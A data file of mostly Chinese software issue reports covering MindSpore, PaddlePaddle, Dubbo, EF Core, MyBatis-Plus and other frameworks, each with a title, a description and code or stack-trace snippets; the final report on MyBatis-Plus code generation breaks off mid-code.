[CT][MS][numpy_native]array not support dtype of str in graph mode,": /device gpu /device cpu : -- MindSpore version :1.4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : python array.py pass   <code>: import mindspore.numpy as np from mindspore import ms_function @ms_function() def test(x): return np.array(x, dtype='int32') a = [2, 3, 4] test(a) mindspore/ccsrc/frontend/operator/composite/multitype_funcgraph.cc:161 GenerateFromTypes] The 'not_equal' operation does not support the type [String, kMetaTypeTypeType]"
dubbo qos 服务配置有更新,"dubbo qos 服务的端口配置参数有变化，另外已经增加了关闭QOS的参数，请海哥更新一下呗   <code>: applicationConfig = new ApplicationConfig(); applicationConfig.setName(""jboot""); if (StringUtils.isNotBlank(dubboConfig.getQosPort())) { // System.setProperty(""dubbo.qos.port"", String.valueOf(dubboConfig.getQosPort())); applicationConfig.setQosEnable(false); applicationConfig.setQosPort(Integer.valueOf(dubboConfig.getQosPort())); }"
[CT][MS][PARALLEL] network with switch_layer could not run auto_parallel,": GPU /device gpu : -- MindSpore version : vm+Graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Train this netwrok using auto_parallel mode. finish train normally   <code>: class DataParallelNet(Cell, MetaFactory): def __init__(self, in_channel, out_channel, strategy1=None, strategy2=None): super().__init__() MetaFactory.__init__(self) self.relu = nn.ReLU() self.relu6 = nn.ReLU6() self.conv = nn.Conv2d(in_channels=in_channel, out_channels=out_channel, kernel_size=2, stride=1, has_bias=False, weight_init='ones', pad_mode='same') self.mean = P.ReduceMean(keep_dims=False) self.fc1 = nn.Dense(in_channels=out_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=True) self.fc2 = nn.Dense(in_channels=out_channel, out_channels=out_channel, weight_init='ones', bias_init='zeros', has_bias=False) if strategy1 is not None: self.fc1.matmul.set_strategy(strategy1) if strategy2 is not None: self.fc2.matmul.set_strategy(strategy2) self.i = Parameter(Tensor(0, mstype.int32), name=""index"", requires_grad=False) self.funcs = (self.fc1, self.fc2) self.cast = P.Cast() weight_np = np.ones([128, 16]).astype(np.float32) * 0.00001 self.embedding = nn.Embedding(128, 16, False, Tensor(weight_np)) def construct(self, x): x = self.relu(x) # (128, 3, 2, 1024) # x = self.relu6(x) # (128, 3, 2, 1024) x = self.conv(x) ##(128, 12, 2, 1024) x = self.mean(x, (2, 3)) # (128, 12) # x = self.fc1(x) # (128, 12) x = self.funcs[self.i](x) x = self.cast(x, ms.int32) # (#(128, 12) x = self.embedding(x) # (128, 12, 3) x = self.mean(x, (2)) # (128, 12) return x"
在使用 OkHttp3 时绕过空 Multipart 错误,"在使用 OkHttp3 时绕过空 Multipart 错误 期望可以绕过该错误   <code>: @Post(url = ""/upload"") ForestRequest&lt;Map&gt; upload(@DataFile(""file"") File file); // okhttp3 后端情况下传入 null 会包错 client.upload(null);"
.net 6版发布后 efcore 报错问题,"visual studio里运行可以正常访问接口 发布后无法正常请求数据 查询Sys_log表后，中的报错信息为   <code>: Cannot create a DbSet for 'Sys_User' because this type is not included in the model for the context. at Microsoft.EntityFrameworkCore.Internal.InternalDbSet`1.get_EntityType() at Microsoft.EntityFrameworkCore.Internal.InternalDbSet`1.CheckState() at Microsoft.EntityFrameworkCore.Internal.InternalDbSet`1.get_EntityQueryable() at Microsoft.EntityFrameworkCore.Internal.InternalDbSet`1.System.Linq.IQueryable.get_Provider() at System.Linq.Queryable.Where[TSource](IQueryable`1 source, Expression`1 predicate) at VOL.Core.BaseProvider.RepositoryBase`1.FindAsIQueryable(Expression`1 predicate, Expression`1 orderBy) in F:\C#\Vue.NetCore\Vue.NetCore\.Net6版本\VOL.Core\BaseProvider\RepositoryBase.cs:line 216 at VOL.System.Repositories.Sys_UserRepository.VOL.Core.BaseProvider.IRepository&lt;VOL.Entity.DomainModels.Sys_User&gt;.FindAsIQueryable(Expression`1 predicate, Expression`1 orderBy) at VOL.System.Services.Sys_UserService.Login(LoginInfo loginInfo, Boolean verificationCode) in F:\C#\Vue.NetCore\Vue.NetCore\.Net6版本\VOL.System\Services\System\Partial\Sys_UserService.cs:line 43"
求解决！！文件上传问题！！！解决后10元红包奉上,"问题描述：当文件为空时，提交报错。求大佬协助解决。 1、按钮 2、post请求代码 3、后台接收文件代码 4、报错代码 5、系统点击上传后提示   <code>: &lt;img th:src=""*{pic}""&gt; &lt;input id=""filePath"" name=""file"" type=""file""&gt; function uploadFile() { var formData = new FormData(); formData.append('id', $(""#id"").val()); formData.append('accountid', $(""#accountid"").val()); formData.append('file', $('#filePath')[0].files[0]); formData.append('title', $(""#title"").val()); $.ajax({ url: prefix + ""/edit"", type: 'post', cache: false, data: formData, processData: false, contentType: false, dataType: ""json"", success: function (result) { $.operate.successCallback(result); } }); } @RequiresPermissions(""system:info:edit"") @Log(title = ""数据推送表"", businessType = BusinessType.UPDATE) @PostMapping(""/edit"") @ResponseBody public AjaxResult editSave(@RequestParam(""file"") MultipartFile file, BaseInfo baseInfo) throws IOException { if (file != null &amp;&amp; file.equals("""")) { String filePath = Global.getUploadPath(); String fileName = FileUploadUtils.upload(filePath, file); baseInfo.setPic(fileName); } return toAjax(baseInfoService.updateBaseInfo(baseInfo)); } org.springframework.web.multipart.support.MissingServletRequestPartException: Required request part 'file' is not present"
启动的时候，多数据源加载的问题,"JDK版本: JDK8 SpringBoot版本: 1.5.9.Release Starter版本: 2.4.0 我自己写了个独立的测试程序，发现启动的时候， DynamicDataSourceAutoConfiguration类在正常注入DynamicDataSourceCreator和DynamicDataSourceProvider之后，DataSource类就不在注入了，造成了DynamicRoutingDataSource类的init方法没有正常执行，进而没有正常加载多个数据源，你碰到过这种问题吗？ 我的测试程序： 是基于mybatis-plus-boot-starter 3.0.5和druid-spring-boot-starter 1.1.10的demo 期望值: 正常加载多数据源 实际值: 只是加载了默认的master数据源 重现步骤 步骤1 步骤2 步骤3   <code>: 2018-11-20 14:18:46.698 INFO 120208 --- [ main] c.b.d.d.DynamicDataSourceCreator : 动态数据源-检测到druid存在,如配置中未指定type,druid会默认配置 2018-11-20 14:19:11.495 INFO 120208 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1,master} inited 2018-11-20 14:19:11.510 INFO 120208 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-2,slave_1} inited 2018-11-20 14:19:11.514 INFO 120208 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-3,slave_2} inited 2018-11-20 14:19:11.517 INFO 120208 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-4,slave_3} inited 2018-11-20 14:19:11.517 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 初始共加载 4 个数据源 2018-11-20 14:19:11.520 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 动态数据源-加载 slave_2 成功 2018-11-20 14:19:11.520 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 动态数据源-加载 slave_3 成功 2018-11-20 14:19:11.520 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 动态数据源-加载 master 成功 2018-11-20 14:19:11.520 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 动态数据源-加载 slave_1 成功 2018-11-20 14:19:11.520 INFO 120208 --- [ main] c.b.d.d.DynamicRoutingDataSource : 当前的默认数据源是单数据源，数据源名为 master 2018-11-20 14:19:12.188 INFO 120208 --- [ main] c.b.s.d.mybatis.test.ApplicationTest : Started ApplicationTest in 27.667 seconds (JVM running for 29.089) 2018-11-20 14:19:47.230 INFO 123368 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} inited _ _ |_ _ _|_. ___ _ | _ | | |\/|_)(_| | |_\ |_)||_|_\ / | 3.0.6 2018-11-20 14:19:58.946 INFO 123368 --- [ main] c.b.d.d.DynamicDataSourceCreator : 动态数据源-检测到druid存在,如配置中未指定type,druid会默认配置 2018-11-20 14:20:31.756 INFO 123368 --- [ main] c.i.s.service.impl.UserServiceImplTest : Started UserServiceImplTest in 55.172 seconds (JVM running for 57.815)"
【众智】【计算-AICPU开发】Select,"Select 1.1 功能介绍 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/array_ops.py class Select(Primitive): 1.3 异常处理 1.4 算子反向   <code>: REG_OP(Select) .INPUT(condition, TensorType({DT_BOOL})) .INPUT(x1,TensorType::BasicType()) .INPUT(x2,TensorType::BasicType()) .OUTPUT(y,TensorType::BasicType()) .OP_END_FACTORY_REG(Select)"
v100训练：terminate called after throwing an instance of 'paddle::platform::EnforceNotMet',"paddlecloud v100训练ctc ocr识别模型。出现如下错误。   <code>: terminate called after throwing an instance of 'paddle::platform::EnforceNotMet' what(): an illegal memory access was encountered at [/paddle/paddle/fluid/framework/details/op_handle_base.cc:37] PaddlePaddle Call Stacks: 0 0x7f441b971d06p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7f441ccb0fa2p paddle::framework::details::OpHandleBase::~OpHandleBase() + 402 2 0x7f441cc8a9e1p paddle::framework::details::FetchOpHandle::~FetchOpHandle() + 17 3 0x7f441cc4ca4ep std::vector&lt;std::unique_ptr&lt;paddle::framework::details::FetchOpHandle, std::default_delete&lt;paddle::framework::details::FetchOpHandle&gt; &gt;, std::allocator&lt;std::unique_ptr&lt;paddle::framework::details::FetchOpHandle, std::default_delete&lt;paddle::framework::details::FetchOpHandle&gt; &gt; &gt; &gt;::~vector() + 46 4 0x7f441cc4bb46p paddle::framework::details::ThreadedSSAGraphExecutor::Run(std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;) + 4390 5 0x7f441cc4fb37p paddle::framework::details::ScopeBufferedSSAGraphExecutor::Run(std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;) + 391 6 0x7f441ba520b9p paddle::framework::ParallelExecutor::Run(std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;, std::string const&amp;) + 489 7 0x7f441b966540p 8 0x7f441b988414p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2596 9 0x7f44a72b4ddcp PyEval_EvalFrameEx + 19596 10 0x7f44a72b621dp PyEval_EvalCodeEx + 2061 11 0x7f44a72b44f1p PyEval_EvalFrameEx + 17313 12 0x7f44a72b621dp PyEval_EvalCodeEx + 2061 13 0x7f44a72b44f1p PyEval_EvalFrameEx + 17313 14 0x7f44a72b621dp PyEval_EvalCodeEx + 2061 15 0x7f44a72b44f1p PyEval_EvalFrameEx + 17313 16 0x7f44a72b497ep PyEval_EvalFrameEx + 18478 17 0x7f44a72b621dp PyEval_EvalCodeEx + 2061 18 0x7f44a72b6352p PyEval_EvalCode + 50 19 0x7f44a72e0f22p PyRun_FileExFlags + 146 20 0x7f44a72e2459p PyRun_SimpleFileExFlags + 217 21 0x7f44a72f7e9dp Py_Main + 3149 22 0x7f44a64f9bd5p __libc_start_main + 245 23 0x4007a1p *** Aborted at 1541572190 (unix time) try ""date -d @1541572190"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGABRT (@0x386) received by PID 902 (TID 0x7f44a79d1700) from PID 902; stack trace: *** @ 0x7f44a6f9f160 (unknown) @ 0x7f44a650d3f7 __GI_raise @ 0x7f44a650e7d8 __GI_abort @ 0x7f4435f62c65 __gnu_cxx::__verbose_terminate_handler() @ 0x7f4435f60e06 __cxxabiv1::__terminate() @ 0x7f4435f5fec9 __cxa_call_terminate @ 0x7f4435f60a7a __gxx_personality_v0 @ 0x7f4436432853 _Unwind_RaiseException_Phase2 @ 0x7f4436432beb _Unwind_RaiseException @ 0x7f4435f61045 __cxa_throw @ 0x7f441ccb0fc0 paddle::framework::details::OpHandleBase::~OpHandleBase() @ 0x7f441cc8a9e1 paddle::framework::details::FetchOpHandle::~FetchOpHandle() @ 0x7f441cc4ca4e std::vector&lt;&gt;::~vector() @ 0x7f441cc4bb46 paddle::framework::details::ThreadedSSAGraphExecutor::Run() @ 0x7f441cc4fb37 paddle::framework::details::ScopeBufferedSSAGraphExecutor::Run() @ 0x7f441ba520b9 paddle::framework::ParallelExecutor::Run() @ 0x7f441b966540 _ZZN8pybind1112cpp_function10initializeIZN6paddle6pybindL13pybind11_initEvEUlRNS2_9framework16ParallelExecutorERKSt6vectorISsSaISsEERKSsE102_vIS6_SB_SD_EINS_4nameENS_9is_methodENS_7siblingEEEEvOT_PFT0_DpT1_EDpRKT2_ENUlRNS_6detail13function_callEE1_4_FUNESV_ @ 0x7f441b988414 pybind11::cpp_function::dispatcher() @ 0x7f44a72b4ddc PyEval_EvalFrameEx @ 0x7f44a72b621d PyEval_EvalCodeEx @ 0x7f44a72b44f1 PyEval_EvalFrameEx @ 0x7f44a72b621d PyEval_EvalCodeEx @ 0x7f44a72b44f1 PyEval_EvalFrameEx @ 0x7f44a72b621d PyEval_EvalCodeEx @ 0x7f44a72b44f1 PyEval_EvalFrameEx @ 0x7f44a72b497e PyEval_EvalFrameEx @ 0x7f44a72b621d PyEval_EvalCodeEx @ 0x7f44a72b6352 PyEval_EvalCode @ 0x7f44a72e0f22 PyRun_FileExFlags @ 0x7f44a72e2459 PyRun_SimpleFileExFlags @ 0x7f44a72f7e9d Py_Main @ 0x7f44a64f9bd5 __libc_start_main /root/paddlejob/run.sh: line 307: 902 Aborted (core dumped) python train.py"
期望本机安装paddlepaddle 0.10.0以上 noavx版，源码安装不成功，求大神指导。,初入门，因docker内调试不太方便，想本机安装paddlepaddle，便于pycharm本地调试，pip内默认的是需支持avx版的0.11.0，网站上的deb包有0.9.0的noavx版本，安装正常但不支持paddle.v2，多次尝试源码安装，每次到cmake..的后一步“make -j ”时，时间非常长，而且build文件夹越来越大，留了8G空间都被占满导致最后不成功，参考安装方式是：http://geek.csdn.net/news/detail/242639，请问有安装成功的大神吗，求指导～～～   <code>: nproc
在使用多租户Repository情况下，先使用Access后使用其他库的情况下，其他Repository会抛对象为空异常,"在使用 多租户Repository 情况下，先使用Access后使用其他库的情况下，其他Repository会抛对象为空异常。 分析源码发现，Access为自定义dll，在使用Access后会把 InstanceFactory.CustomDllName 赋值为 SqlSugar.Access ，后期使用其他库的时候 InstanceFactory.CustomDllName 因为静态属性不会清空 引发异常。 目前我的临时解决办法如下： 期待修复！   <code>: public Repository() : base(DBContext.db.GetConnectionScopeWithAttr&lt;T&gt;()) { if (Context.CurrentConnectionConfig.DbType != DbType.Access &amp;&amp; Context.CurrentConnectionConfig.DbType!= DbType.MySqlConnector) { InstanceFactory.CustomDllName = """"; } }"
AutoFill中设置默认选中时，输入框没有显示选中的值,复现步骤：(页面 https://www.blazor.zone/autofills） 1.设置默认选中： 运行： 如图，已经成功设置默认选中，但输入框中并没有显示选中的项。 我不清楚这是 by desgin 还是 bug.   <code>: protected override void OnInitialized() { base.OnInitialized(); Items = Foo.GenerateFoo(LocalizerFoo); Model = Items.First(); }
feign 服务间调用异常,"环境信息 pigx版本: 3.10 是否修改包名: 是 提供详细 1，新增微服务tserver-asset-biz,部署在另一台服务器上 2，tserver-asset-biz 服务controller中业务回调upms的feign接口获取信息，报错误 feign 服务间调用异常 其中错误1处，错误2处，均报错，都是一种错误 错误信息如下： 请确认下，部署不同的机器的服务，应该注意哪些地方？   <code>: @SysLog(""所有网关列表"") //错误1 @GetMapping(""/gatewayList"") public R gatewayList(@RequestParam(""tenantId"") Integer tenantId){ String url = gatewayService.getUrlByTenantId(tenantId);//错误2 if(url.equals("""")){ return R.failed(""********""); } List&lt;Gateway&gt; list = gatewayService.gatewayList(url); return R.ok(list); } feign.RetryableException: 没有到主机的路由 (Host unreachable) executing POST http://tserver-upms-biz/log/save at feign.FeignException.errorExecuting(FeignException.java:249) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:129) at feign.SynchronousMethodHandler.invoke(SynchronousMethodHandler.java:89) at com.tenstech.tserver.common.sentinel.feign.TserverSentinelInvocationHandler.invoke(TserverSentinelInvocationHandler.java:100) at com.sun.proxy.$Proxy226.saveLog(Unknown Source) at com.tenstech.tserver.common.log.event.SysLogListener.saveSysLog(SysLogListener.java:45) at com.tenstech.tserver.common.log.event.SysLogListener$$FastClassBySpringCGLIB$$5848df40.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.interceptor.AsyncExecutionInterceptor.lambda$invoke$0(AsyncExecutionInterceptor.java:115) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Caused by: java.net.NoRouteToHostException: 没有到主机的路由 (Host unreachable) at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:607) at sun.net.NetworkClient.doConnect(NetworkClient.java:175) at sun.net.www.http.HttpClient.openServer(HttpClient.java:463) at sun.net.www.http.HttpClient.openServer(HttpClient.java:558) at sun.net.www.http.HttpClient.&lt;init&gt;(HttpClient.java:242) at sun.net.www.http.HttpClient.New(HttpClient.java:339) at sun.net.www.http.HttpClient.New(HttpClient.java:357) at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(HttpURLConnection.java:1223) at sun.net.www.protocol.http.HttpURLConnection.plainConnect0(HttpURLConnection.java:1162) at sun.net.www.protocol.http.HttpURLConnection.plainConnect(HttpURLConnection.java:1056) at sun.net.www.protocol.http.HttpURLConnection.connect(HttpURLConnection.java:990) at sun.net.www.protocol.http.HttpURLConnection.getOutputStream0(HttpURLConnection.java:1337) at sun.net.www.protocol.http.HttpURLConnection.getOutputStream(HttpURLConnection.java:1312) at feign.Client$Default.convertAndSend(Client.java:202) at feign.Client$Default.execute(Client.java:103) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:93) at org.springframework.cloud.openfeign.ribbon.FeignLoadBalancer.execute(FeignLoadBalancer.java:56) at com.netflix.client.AbstractLoadBalancerAwareClient$1.call(AbstractLoadBalancerAwareClient.java:104) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:303) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$3$1.call(LoadBalancerCommand.java:287) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:231) at rx.internal.util.ScalarSynchronousObservable$3.call(ScalarSynchronousObservable.java:228) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.drain(OnSubscribeConcatMap.java:286) at rx.internal.operators.OnSubscribeConcatMap$ConcatMapSubscriber.onNext(OnSubscribeConcatMap.java:144) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:185) at com.netflix.loadbalancer.reactive.LoadBalancerCommand$1.call(LoadBalancerCommand.java:180) at rx.Observable.unsafeSubscribe(Observable.java:10327) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:94) at rx.internal.operators.OnSubscribeConcatMap.call(OnSubscribeConcatMap.java:42) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:48) at rx.internal.operators.OnSubscribeLift.call(OnSubscribeLift.java:30) at rx.Observable.subscribe(Observable.java:10423) at rx.Observable.subscribe(Observable.java:10390) at rx.observables.BlockingObservable.blockForSingle(BlockingObservable.java:443) at rx.observables.BlockingObservable.single(BlockingObservable.java:340) at com.netflix.client.AbstractLoadBalancerAwareClient.executeWithLoadBalancer(AbstractLoadBalancerAwareClient.java:112) at org.springframework.cloud.openfeign.ribbon.LoadBalancerFeignClient.execute(LoadBalancerFeignClient.java:83) at feign.SynchronousMethodHandler.executeAndDecode(SynchronousMethodHandler.java:119) ... 14 common frames omitted"
Fix dev image build error,It seems has updated to which will break jupyter installation. Use the fixed version instead.   <code>: ipykernel 4.6.1
php版本的method段配置错误,"在配置文件service/php/src/config.php中自定义缓存可用方法中的配置为 但实际上在fastknife\ajcaptcha\src\Domain\Logic\Cache.php中其实是对配置中的methods字段进行合并，所以需要修改 method为methods才可以正常使用   <code>: 'method' =&gt; [ //遵守PSR-16规范不需要设置此项目（tp6, laravel,hyperf）。如tp5就不支持（delete =&gt; rm）, 'get' =&gt; 'get', //获取 'set' =&gt; 'set', //设置 'delete' =&gt; 'delete',//删除 'has' =&gt; 'has' //key是否存在 ]"
fluid.Trainer对象无法加载保存的参数,"fluid.Trainer对象无法加载保存的参数，该对象的__init__方法下这一段代码 是否应该是   <code>: if param_path and os.path.isdir(param_path): # load params from param_path into scope io.load_persistables( executor=exe, dirname=param_path, main_program=self.startup_program) with self._prog_and_scope_guard(): if param_path and os.path.isdir(param_path): # load params from param_path into scope io.load_persistables( executor=exe, dirname=param_path, main_program=self.startup_program)"
启动类中PropKit使用异常,rc4版本，启动类中调用了PropKit，报错提示找不到class。 rc3是可以正常使用的。   <code>: java.lang.NoClassDefFoundError: com/jfinal/kit/PropKit INFO | jvm 1 | 2017/10/30 16:13:01 | java.lang.NoClassDefFoundError: com/jfinal/kit/PropKit
JSONObject.parse 问题,"JDK版本： openjdk_8_201 hutool版本： 5.3.0 JSONUtil.parseObj新版本parseObj存在问题，都是null 打印为null   <code>: JSONObject parse = JSONUtil.parseObj(""{'msg':'这里还没有内容','data':{'cards':[]},'ok':0}""); System.out.println(parse);"
Merge distributed book demo code to the origin demo code.,So we do not need another folder and the demo codes will be synced.   <code>: book_distribute
代码生成设置superEntityClass，superEntity有的字段，子类还会生成,"当前使用版本 mybatis-plus-boot-starter v3.3.1，应该是所有版本都有 在 StrategyConfig 中设置 superEntityClass，生成代码只做了 extends 继承，没有处理相同字段 如：表 A和B 有相同字段 CREATE_BY、CREATE_DATE、UPDATE_BY、UPDATE_DATE，提取相同字段到 BaseEntity，配置 superEntityClass 之后再生成代码 A和B还会生成 CREATE_BY、CREATE_DATE、UPDATE_BY、UPDATE_DATE 字段 。 注：我是通过 重写 AutoGenerator::getAllTableInfoList 来实现的，缺陷是 toString 中不包含 父类字段信息 补充测试（v3.3.2 测试结果），不能上传附件。 xml 中 commonFields 和 fields 没有对齐 子类 toString 没有父类的属性信息 注：问题临时解决方案 配置 StrategyConfig strategy.setNaming(NamingStrategy.underline_to_camel); strategy.setColumnNaming(NamingStrategy.underline_to_camel); 自定义 TemplateConfig templateConfig.setEntity(""/entity.java""); templateConfig.setXml(""/mapper.xml""); 不符合需求   <code>: &lt;project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd""&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-gen&lt;/artifactId&gt; &lt;version&gt;1.1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt; &lt;name&gt;mybatis gen&lt;/name&gt; &lt;description&gt;mybatis gen&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;maven.compiler.source&gt;${java.version}&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;${java.version}&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;${java.version}&lt;/maven.compiler.compilerVersion&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- ORACLE 驱动 --&gt; &lt;dependency&gt; &lt;groupId&gt;oracle&lt;/groupId&gt; &lt;artifactId&gt;ojdbc7&lt;/artifactId&gt; &lt;version&gt;12.1.0.2.0&lt;/version&gt; &lt;scope&gt;system&lt;/scope&gt; &lt;systemPath&gt;${project.basedir}/libs/ojdbc7.jar&lt;/systemPath&gt; &lt;/dependency&gt; &lt;!-- mybatisPlus 核心库 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mybatisPlus 代码生成器 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.3.1&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mybatisPlus Velocity 模版引擎 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt; &lt;artifactId&gt;velocity-engine-core&lt;/artifactId&gt; &lt;version&gt;2.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- mybatisPlus Freemarker 模版引擎 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.freemarker&lt;/groupId&gt; &lt;artifactId&gt;freemarker&lt;/artifactId&gt; &lt;version&gt;2.3.30&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/project&gt; import com.baomidou.mybatisplus.annotation.TableField; import java.io.Serializable; import java.util.Date; public class BaseEntity implements Serializable { /** * 功能说明: 状态 [ A - ACTIVE(可用状态) | I - INACTIVE(无效状态) ] */ @TableField(""STATUS"") private String status; /** * 功能说明: createDate */ @TableField(""CREATE_DATE"") private Date createDate; /** * 功能说明: createBy */ @TableField(""CREATE_BY"") private String createBy; /** * 功能说明: updateDate */ @TableField(""UPDATE_DATE"") private Date updateDate; /** * 功能说明: updateBy */ @TableField(""UPDATE_BY"") private String updateBy; public String getStatus() { return status; } public void setStatus(String status) { this.status = status; } public Date getCreateDate() { return createDate; } public void setCreateDate(Date createDate) { this.createDate = createDate; } public String getCreateBy() { return createBy; } public void setCreateBy(String createBy) { this.createBy = createBy; } public Date getUpdateDate() { return updateDate; } public void setUpdateDate(Date updateDate) { this.updateDate = updateDate; } public String getUpdateBy() { return updateBy; } public void setUpdateBy(String updateBy) { this.updateBy = updateBy; } } import com.baomidou.mybatisplus.annotation.DbType; import com.baomidou.mybatisplus.generator.AutoGenerator; import com.baomidou.mybatisplus.generator.config.DataSourceConfig; import com.baomidou.mybatisplus.generator.config.GlobalConfig; import com.baomidou.mybatisplus.generator.config.PackageConfig; import com.baomidou.mybatisplus.generator.config.StrategyConfig; import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy; import com.sgm.scmsmp.pojo.BaseEntity; import java.io.File; import java.io.FileInputStream; import java.io.InputStream; import java.util.Properties; /** * Mybatis-Plus代码生成器 * 此类只用作代码生成 */ public class MybatisPlusGen { // 修改此变量生成代码 private static final String file = ""D:\\MybatisPlusCode""; // 固定参数 private static DbType dbType; private static String driverName; private static String url; private static String name; private static String password; static void init() { Properties properties = new Properties(); try (InputStream is = new FileInputStream(new File(file + ""\\conf.txt""))) { properties.load(is); dbType = DbType.valueOf(properties.getProperty(""dbType"")); driverName = properties.getProperty(""driverName""); url = properties.getProperty(""url""); name = properties.getProperty(""username""); password = properties.getProperty(""password""); } catch (Exception e) { throw new RuntimeException(e); } } public static void main(String[] args) { // 属性不方便公开 init(); AutoGenerator ag = new AutoGenerator(); // 全局配置 GlobalConfig gc = new GlobalConfig(); gc.setOutputDir(file); gc.setFileOverride(true); gc.setActiveRecord(false);// 不需要ActiveRecord特性的请改为false gc.setEnableCache(false);// XML 二级缓存 gc.setBaseResultMap(true);// XML ResultMap gc.setBaseColumnList(false);// XML columList //作者 gc.setAuthor(""HX""); //自定义文件命名，注意 %s 会自动填充表实体属性！ gc.setControllerName(""%sController""); gc.setServiceName(""%sService""); gc.setServiceImplName(""%sServiceImpl""); gc.setMapperName(""%sMapper""); gc.setXmlName(""%sMapper""); ag.setGlobalConfig(gc); //数据源配置 DataSourceConfig dsc = new DataSourceConfig(); dsc.setDbType(dbType); dsc.setDriverName(driverName); dsc.setUsername(name); dsc.setPassword(password); dsc.setUrl(url); ag.setDataSource(dsc); //需要生成的表 String[] tables = new String[]{""TM_APPLICATION""}; //项目包名 String mybatisPackage = ""com.demo""; // 策略配置 StrategyConfig strategy = new StrategyConfig(); //此处可以修改为表前缀 strategy.setTablePrefix(new String[]{""TM_""}); //表名生成策略 strategy.setNaming(NamingStrategy.underline_to_camel); strategy.setColumnNaming(NamingStrategy.underline_to_camel); //需要生成的表 strategy.setInclude(tables); strategy.setSuperServiceClass(null); strategy.setSuperServiceImplClass(null); strategy.setSuperMapperClass(null); // 配置 @RestController strategy.setRestControllerStyle(true); // 设置 superEntityClass strategy.setSuperEntityClass(BaseEntity.class.getName()); ag.setStrategy(strategy); //包配置 PackageConfig pc = new PackageConfig(); pc.setParent(mybatisPackage); pc.setController(""controller""); pc.setService(""service""); pc.setServiceImpl(""service.impl""); pc.setMapper(""mapper""); pc.setEntity(""entity""); pc.setXml(""xml""); ag.setPackageInfo(pc); 